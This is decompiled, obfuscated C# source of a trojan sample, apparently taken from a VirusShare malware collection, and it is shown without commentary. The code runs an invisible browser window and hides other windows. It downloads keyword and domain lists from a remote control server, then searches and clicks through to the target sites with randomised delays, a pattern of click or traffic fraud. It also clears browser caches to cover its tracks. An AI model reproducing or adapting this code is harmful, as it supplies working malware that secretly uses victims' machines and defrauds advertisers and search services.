// Decompiled with JetBrains decompiler
// Type: viBrowser.Form1
// Assembly: viBrowser Elite, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E65FEE22-663C-4BB1-B104-49ABF096C78C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.iann-3199eae16d9701edf72ed2073c259ab24ccfc6d3fec4ed61ee52d2853f600edd.exe

using SmartAssembly.StringsEncoding;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace viBrowser
{
  public class Form1 : Form
  {
    private const int SW_HIDE = 0;
    public const int SWP_HIDEWINDOW = 128;
    private const int GWL_EXSTYLE = -20;
    private const int WS_EX_TOOLWINDOW = 128;
    private const int INTERNET_OPTION_END_BROWSER_SESSION = 42;
    private string ana = Strings.Get(223);
    private string baba = Strings.Get(264);
    private System.Collections.Generic.Queue<KeyValuePair<string, string>> kelimelistesi = new System.Collections.Generic.Queue<KeyValuePair<string, string>>();
    private string kelime;
    private string domain;
    private int suankisayfa = 1;
    private Dictionary<string, bool> gezilenler = new Dictionary<string, bool>();
    private Random rnd = new Random();
    private IContainer components = (IContainer) null;
    private WebBrowser webBrowser1;
    private System.Windows.Forms.Timer timer1;
    private System.Windows.Forms.Timer timer2;

    [DllImport("User32")]
    private static extern int ShowWindow(int hwnd, int nCmdShow);

    [DllImport("User32.dll")]
    public static extern int FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetWindowPos(
      IntPtr hWnd,
      IntPtr hWndInsertAfter,
      int x,
      int y,
      int cx,
      int cy,
      uint uFlags);

    [DllImport("user32.dll")]
    public static extern bool SetForegroundWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern int SetWindowLong(IntPtr window, int index, int value);

    [DllImport("user32.dll")]
    public static extern int GetWindowLong(IntPtr window, int index);

    [DllImport("winmm.dll")]
    public static extern int sndPlaySound(string lpszSoundName, int uFlags);

    [DllImport("wininet.dll", SetLastError = true)]
    private static extern bool InternetSetOption(
      IntPtr hInternet,
      int dwOption,
      IntPtr lpBuffer,
      int lpdwBufferLength);

    public Form1() => this.InitializeComponent();

    private void webBrowser1_NewWindow(object sender, CancelEventArgs e) => \u0012.\u007E\u0082((object) e, true);

    private void Basla()
    {
      this.DeleteCache();
      try
      {
        this.suankisayfa = 1;
        KeyValuePair<string, string> keyValuePair = this.kelimelistesi.Dequeue();
        this.kelime = keyValuePair.Key;
        this.domain = keyValuePair.Value;
        while (\u0014.\u007E\u008E((object) this.webBrowser1))
          \u0013.\u008C(10000);
        \u0015.\u007E\u0090((object) this.webBrowser1, Strings.Get(301));
      }
      catch (InvalidOperationException ex)
      {
        \u0013.\u008D(-1);
      }
    }

    private void KelimeleriCek()
    {
      WebClient webClient = new WebClient();
      try
      {
        string str1 = Strings.Get(358);
        try
        {
          str1 = \u0016.\u007E\u0095((object) webClient, this.baba);
        }
        catch (Exception ex)
        {
          \u0013.\u008D(-1);
        }
        \u0017 obj = \u0017.\u007E\u0097;
        string str2 = str1;
        char[] chArray = new char[1]{ '\n' };
        foreach (string str3 in obj((object) str2, chArray))
        {
          string[] strArray = \u0017.\u007E\u0097((object) \u0008.\u007E\u0017((object) str3), new char[1]
          {
            '|'
          });
          try
          {
            string key = strArray[1];
            KeyValuePair<string, string> keyValuePair = new KeyValuePair<string, string>(strArray[0], key);
            this.gezilenler.Add(key, false);
            this.kelimelistesi.Enqueue(keyValuePair);
          }
          catch
          {
          }
        }
      }
      finally
      {
        if (webClient != null)
          \u0006.\u007E\u0008((object) webClient);
      }
    }

    private void ButonTikla(string attribute, string value)
    {
      if (!\u0019.\u0099(\u0018.\u007E\u0098((object) this.webBrowser1), (HtmlDocument) null))
        return;
      HtmlElementCollection elementCollection = \u001A.\u007E\u009A((object) \u0018.\u007E\u0098((object) this.webBrowser1), Strings.Get(359));
      IEnumerator enumerator = \u001B.\u007E\u009B((object) elementCollection);
      try
      {
        while (\u0014.\u007E\u008F((object) enumerator))
        {
          HtmlElement htmlElement = (HtmlElement) \u001C.\u007E\u009C((object) enumerator);
          if (\u001D.\u007E\u009D((object) \u0016.\u007E\u0096((object) htmlElement, attribute), value))
          {
            \u0015.\u007E\u0091((object) htmlElement, Strings.Get(368));
            \u0015.\u007E\u0091((object) htmlElement, Strings.Get(385));
            object obj = \u001E.\u007E\u0002\u0002((object) htmlElement, Strings.Get(402));
          }
        }
      }
      finally
      {
        if (enumerator is IDisposable disposable)
          \u0006.\u007E\u0008((object) disposable);
      }
    }

    private void itButonTikla()
    {
      if (!\u0019.\u0099(\u0018.\u007E\u0098((object) this.webBrowser1), (HtmlDocument) null))
        return;
      HtmlElementCollection elementCollection = \u001A.\u007E\u009A((object) \u0018.\u007E\u0098((object) this.webBrowser1), Strings.Get(359));
      IEnumerator enumerator = \u001B.\u007E\u009B((object) elementCollection);
      try
      {
        while (\u0014.\u007E\u008F((object) enumerator))
        {
          HtmlElement htmlElement = (HtmlElement) \u001C.\u007E\u009C((object) enumerator);
          if (\u001D.\u007E\u009D((object) \u0016.\u007E\u0096((object) htmlElement, Strings.Get(411)), Strings.Get(420)))
          {
            object obj = \u001E.\u007E\u0002\u0002((object) htmlElement, Strings.Get(402));
          }
        }
      }
      finally
      {
        if (enumerator is IDisposable disposable)
          \u0006.\u007E\u0008((object) disposable);
      }
    }

    private void webBrowser1_DocumentCompleted(
      object sender,
      WebBrowserDocumentCompletedEventArgs e)
    {
      string str = \u0008.\u007E\u0018((object) \u001F.\u007E\u0003\u0002((object) e));
      if (\u0010.\u007F(str, Strings.Get(301)))
      {
        this.SureliIslet((Form1.SureliFonksiyon) (() =>
        {
          this.TextBoxYaz(Strings.Get(1093), Strings.Get(1102), Strings.Get(1107));
          this.TextBoxYaz(Strings.Get(1093), Strings.Get(1112), this.kelime);
        }), 3000, 5000);
        this.SureliIslet((Form1.SureliFonksiyon) (() => this.ButonTikla(Strings.Get(411), Strings.Get(420))), 7000, 11000);
      }
      else if (\u001D.\u007E\u009E((object) str, Strings.Get(433)) && !\u001D.\u007E\u009D((object) str, Strings.Get(486)))
        this.SureliIslet((Form1.SureliFonksiyon) (() =>
        {
          if (this.LinkeTikla(this.domain))
            return;
          this.SureliIslet(new Form1.SureliFonksiyon(this.Ilerle), 5000, 12000);
        }), 3000, 6000);
      else if (\u001D.\u007E\u009E((object) str, Strings.Get(495)) && \u001D.\u007E\u009D((object) str, Strings.Get(486)))
      {
        this.SureliIslet((Form1.SureliFonksiyon) (() =>
        {
          if (this.LinkeTikla(this.domain))
            return;
          this.SureliIslet(new Form1.SureliFonksiyon(this.Ilerle), 5000, 12000);
        }), 3000, 6000);
      }
      else
      {
        if (!\u001D.\u007E\u009D((object) str, this.domain) || \u001D.\u007E\u009E((object) str, Strings.Get(495)))
          return;
        this.SureliIslet((Form1.SureliFonksiyon) (() =>
        {
          if (this.gezilenler[this.domain])
            return;
          this.RastGeleGez();
        }), 20000, 50000);
      }
    }

    private void Ilerle()
    {
      ++this.suankisayfa;
      HtmlElementCollection elementCollection = \u007F.\u007E\u0004\u0002((object) \u0018.\u007E\u0098((object) this.webBrowser1));
      IEnumerator enumerator = \u001B.\u007E\u009B((object) elementCollection);
      try
      {
        while (\u0014.\u007E\u008F((object) enumerator))
        {
          HtmlElement htmlElement = (HtmlElement) \u001C.\u007E\u009C((object) enumerator);
          if (\u0010.\u007F(\u0008.\u007E\u0019((object) htmlElement), this.suankisayfa.ToString()) || \u0010.\u007F(\u0008.\u007E\u0019((object) htmlElement), \u0080.\u0005\u0002(this.suankisayfa.ToString(), Strings.Get(524))))
          {
            \u0015.\u007E\u0091((object) htmlElement, Strings.Get(368));
            \u0015.\u007E\u0091((object) htmlElement, Strings.Get(385));
            object obj = \u001E.\u007E\u0002\u0002((object) htmlElement, Strings.Get(402));
          }
        }
      }
      finally
      {
        if (enumerator is IDisposable disposable)
          \u0006.\u007E\u0008((object) disposable);
      }
    }

    private void RastGeleGez()
    {
      if (!\u0019.\u0099(\u0018.\u007E\u0098((object) this.webBrowser1), (HtmlDocument) null))
        return;
      HtmlElementCollection elementCollection = \u001A.\u007E\u009A((object) \u0018.\u007E\u0098((object) this.webBrowser1), Strings.Get(529));
      List<HtmlElement> htmlElementList = new List<HtmlElement>(\u0081.\u007E\u0006\u0002((object) elementCollection));
      if (\u0081.\u007E\u0006\u0002((object) elementCollection) > 0)
      {
        IEnumerator enumerator = \u001B.\u007E\u009B((object) elementCollection);
        try
        {
          while (\u0014.\u007E\u008F((object) enumerator))
          {
            HtmlElement htmlElement = (HtmlElement) \u001C.\u007E\u009C((object) enumerator);
            if (\u0010.\u0080(\u0016.\u007E\u0096((object) htmlElement, Strings.Get(534)), Strings.Get(543)) && !\u0001.\u0002(\u0008.\u007E\u001A((object) htmlElement)) && this.NormalLink(\u0016.\u007E\u0096((object) htmlElement, Strings.Get(552))))
              htmlElementList.Add(htmlElement);
          }
        }
        finally
        {
          if (enumerator is IDisposable disposable)
            \u0006.\u007E\u0008((object) disposable);
        }
        if (htmlElementList.Count > 0)
        {
          \u0015.\u007E\u0091((object) htmlElementList[\u0082.\u007E\u0008\u0002((object) this.rnd, htmlElementList.Count - 1)], Strings.Get(368));
          \u0015.\u007E\u0091((object) htmlElementList[\u0082.\u007E\u0008\u0002((object) this.rnd, htmlElementList.Count - 1)], Strings.Get(385));
          object obj = \u001E.\u007E\u0002\u0002((object) htmlElementList[\u0082.\u007E\u0008\u0002((object) this.rnd, htmlElementList.Count - 1)], Strings.Get(402));
          htmlElementList.Clear();
        }
      }
      this.SureliIslet((Form1.SureliFonksiyon) (() => this.SureliIslet(new Form1.SureliFonksiyon(this.Basla), 240001, 241000)), 5000, 6000);
    }

    private bool NormalLink(string url) => !\u001D.\u007E\u009F((object) url, Strings.Get(561)) && !\u001D.\u007E\u009F((object) url, Strings.Get(566)) && !\u001D.\u007E\u009F((object) url, Strings.Get(571)) && !\u001D.\u007E\u009F((object) url, Strings.Get(588)) && !\u001D.\u007E\u009F((object) url, Strings.Get(605)) && !\u001D.\u007E\u009F((object) url, Strings.Get(614)) && !\u001D.\u007E\u009F((object) url, Strings.Get(623)) && !\u001D.\u007E\u009F((object) url, Strings.Get(632)) && !\u001D.\u007E\u009F((object) url, Strings.Get(641)) && !\u001D.\u007E\u009F((object) url, Strings.Get(650)) && !\u001D.\u007E\u009F((object) url, Strings.Get(659)) && !\u001D.\u007E\u009F((object) url, Strings.Get(668)) && !\u001D.\u007E\u009F((object) url, Strings.Get(677)) && !\u001D.\u007E\u009F((object) url, Strings.Get(686));

    private void DeleteCache()
    {
      ProcessStartInfo processStartInfo1 = new ProcessStartInfo();
      \u0015.\u007E\u0092((object) processStartInfo1, Strings.Get(695));
      \u0015.\u007E\u0093((object) processStartInfo1, Strings.Get(712));
      Process process1 = \u0083.\u000E\u0002(processStartInfo1);
      \u0006.\u007E\u000E((object) process1);
      ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
      \u0015.\u007E\u0092((object) processStartInfo2, Strings.Get(695));
      \u0015.\u007E\u0093((object) processStartInfo2, Strings.Get(761));
      Process process2 = \u0083.\u000E\u0002(processStartInfo2);
      \u0006.\u007E\u000E((object) process2);
      Form1.InternetSetOption(IntPtr.Zero, 42, IntPtr.Zero, 0);
    }

    private void TextBoxYaz(string att, string attname, string attvalue)
    {
      if (!\u0019.\u0099(\u0018.\u007E\u0098((object) this.webBrowser1), (HtmlDocument) null))
        return;
      HtmlElementCollection elementCollection = \u001A.\u007E\u009A((object) \u0018.\u007E\u0098((object) this.webBrowser1), Strings.Get(359));
      IEnumerator enumerator = \u001B.\u007E\u009B((object) elementCollection);
      try
      {
        while (\u0014.\u007E\u008F((object) enumerator))
        {
          HtmlElement htmlElement = (HtmlElement) \u001C.\u007E\u009C((object) enumerator);
          if (\u001D.\u007E\u0001\u0002((object) \u0016.\u007E\u0096((object) htmlElement, att), attname))
            \u0084.\u007E\u000F\u0002((object) htmlElement, Strings.Get(411), attvalue);
        }
      }
      finally
      {
        if (enumerator is IDisposable disposable)
          \u0006.\u007E\u0008((object) disposable);
      }
    }

    private bool LinkeTikla(string url)
    {
      bool flag = false;
      List<string> stringList = new List<string>();
      if (\u0019.\u0099(\u0018.\u007E\u0098((object) this.webBrowser1), (HtmlDocument) null))
      {
        HtmlElementCollection elementCollection = \u007F.\u007E\u0004\u0002((object) \u0018.\u007E\u0098((object) this.webBrowser1));
        IEnumerator enumerator = \u001B.\u007E\u009B((object) elementCollection);
        try
        {
          while (\u0014.\u007E\u008F((object) enumerator))
          {
            HtmlElement htmlElement = (HtmlElement) \u001C.\u007E\u009C((object) enumerator);
            string str = \u0016.\u007E\u0096((object) htmlElement, Strings.Get(552));
            stringList.Add(str);
            if (!\u001D.\u007E\u009D((object) str, Strings.Get(810)) && !\u001D.\u007E\u009D((object) str, Strings.Get(855)) && \u001D.\u007E\u009D((object) \u0016.\u007E\u0096((object) htmlElement, Strings.Get(552)), url))
            {
              \u0015.\u007E\u0091((object) htmlElement, Strings.Get(368));
              \u0015.\u007E\u0091((object) htmlElement, Strings.Get(385));
              object obj = \u001E.\u007E\u0002\u0002((object) htmlElement, Strings.Get(876));
              flag = true;
              break;
            }
          }
        }
        finally
        {
          if (enumerator is IDisposable disposable)
            \u0006.\u007E\u0008((object) disposable);
        }
      }
      return flag;
    }

    private void SureliIslet(Form1.SureliFonksiyon x, int min, int max)
    {
      System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
      \u0087.\u007E\u0012\u0002((object) timer1, \u0086.\u007E\u0011\u0002((object) this.rnd, min, max));
      System.Windows.Forms.Timer timer2 = timer1;
      \u0088.\u007E\u0014\u0002((object) timer2, (EventHandler) ((s, ev) =>
      {
        x();
        \u0006.\u007E\u0012((object) (System.Windows.Forms.Timer) s);
        \u0006.\u007E\u0013((object) (System.Windows.Forms.Timer) s);
      }));
      \u0006.\u007E\u000F((object) timer2);
    }

    private void PanelAyarla()
    {
      string str1 = Strings.Get(358);
      WebHeaderCollection headerCollection1 = new WebHeaderCollection();
      \u0084.\u007E\u0010\u0002((object) headerCollection1, Strings.Get(885), Strings.Get(902));
      WebHeaderCollection headerCollection2 = headerCollection1;
      WebClient webClient1 = new WebClient();
      \u008A.\u007E\u0018\u0002((object) webClient1, \u0089.\u0016\u0002());
      \u008B.\u007E\u0019\u0002((object) webClient1, headerCollection2);
      WebClient webClient2 = webClient1;
      try
      {
        string str2 = \u0016.\u007E\u0095((object) webClient2, this.ana);
        Regex regex = new Regex(Strings.Get(971), RegexOptions.IgnoreCase | RegexOptions.Compiled);
        Match match = \u008C.\u007E\u001A\u0002((object) regex, str2);
        str1 = \u0008.\u007E\u0018((object) \u008E.\u007E\u001C\u0002((object) \u008D.\u007E\u001B\u0002((object) match), 1));
      }
      catch (Exception ex)
      {
        \u0013.\u008D(-1);
      }
      finally
      {
        if (webClient2 != null)
          \u0006.\u007E\u0008((object) webClient2);
      }
      this.baba = \u008F.\u007E\u001D\u0002((object) this.baba, Strings.Get(984), str1);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      \u0090.\u001E\u0002((object) this, new Size(\u0086.\u007E\u0011\u0002((object) this.rnd, 1024, 1366), \u0086.\u007E\u0011\u0002((object) this.rnd, 768, 768)));
      int windowLong = Form1.GetWindowLong(\u0091.\u0080\u0002((object) this), -20);
      Form1.SetWindowLong(\u0091.\u0080\u0002((object) this), -20, windowLong | 128);
      this.ieKontrol();
      this.PanelAyarla();
      this.KelimeleriCek();
      Araclar.DisableClickSounds();
      this.Basla();
    }

    private void ieKontrol()
    {
      WebBrowser webBrowser = new WebBrowser();
      Version version = \u0092.\u007E\u0081\u0002((object) webBrowser);
      if (\u0081.\u007E\u0007\u0002((object) version) < 7)
        \u0013.\u008D(-1);
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
      int window = Form1.FindWindow((string) null, Strings.Get(1001));
      if (window == 0)
        return;
      Form1.ShowWindow(window, 0);
    }

    private void timer2_Tick(object sender, EventArgs e)
    {
      int window = Form1.FindWindow((string) null, Strings.Get(1034));
      if (window == 0)
        return;
      Form1.SetWindowPos(\u0093.\u0082\u0002(window), IntPtr.Zero, 0, 0, 0, 0, 128U);
      int windowLong = Form1.GetWindowLong(\u0093.\u0082\u0002(window), -20);
      Form1.SetWindowLong(\u0093.\u0082\u0002(window), -20, windowLong | 128);
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        \u0006.\u007E\u0008((object) this.components);
      \u0012.\u0083((object) this, disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.webBrowser1 = new WebBrowser();
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.timer2 = new System.Windows.Forms.Timer(this.components);
      \u0006.\u0010((object) this);
      \u0094.\u007E\u0083\u0002((object) this.webBrowser1, DockStyle.Fill);
      \u0012.\u007E\u0084((object) this.webBrowser1, false);
      \u0095.\u007E\u0084\u0002((object) this.webBrowser1, new Point(0, 0));
      \u0015.\u007E\u0094((object) this.webBrowser1, Strings.Get(1067));
      \u0012.\u007E\u0086((object) this.webBrowser1, true);
      \u0090.\u007E\u001F\u0002((object) this.webBrowser1, new Size(761, 488));
      \u0087.\u007E\u0013\u0002((object) this.webBrowser1, 0);
      \u0012.\u007E\u0087((object) this.webBrowser1, false);
      \u0096.\u007E\u0086\u0002((object) this.webBrowser1, new WebBrowserDocumentCompletedEventHandler(this.webBrowser1_DocumentCompleted));
      \u0097.\u007E\u0087\u0002((object) this.webBrowser1, new CancelEventHandler(this.webBrowser1_NewWindow));
      \u0012.\u007E\u0088((object) this.timer1, true);
      \u0087.\u007E\u0012\u0002((object) this.timer1, 1);
      \u0088.\u007E\u0014\u0002((object) this.timer1, new EventHandler(this.timer1_Tick));
      \u0012.\u007E\u0088((object) this.timer2, true);
      \u0087.\u007E\u0012\u0002((object) this.timer2, 1);
      \u0088.\u007E\u0014\u0002((object) this.timer2, new EventHandler(this.timer2_Tick));
      \u0098.\u0088\u0002((object) this, new SizeF(6f, 13f));
      \u0099.\u0089\u0002((object) this, AutoScaleMode.Font);
      \u0090.\u007F\u0002((object) this, new Size(761, 488));
      \u009B.\u007E\u008B\u0002((object) \u009A.\u008A\u0002((object) this), (Control) this.webBrowser1);
      \u0015.\u0094((object) this, Strings.Get(1084));
      \u009C.\u008C\u0002((object) this, 0.0);
      \u0012.\u0089((object) this, false);
      \u0012.\u008A((object) this, false);
      \u009D.\u008D\u0002((object) this, FormStartPosition.CenterScreen);
      \u0088.\u0015\u0002((object) this, new EventHandler(this.Form1_Load));
      \u0012.\u008B((object) this, false);
    }

    private delegate void SureliFonksiyon();
  }
}
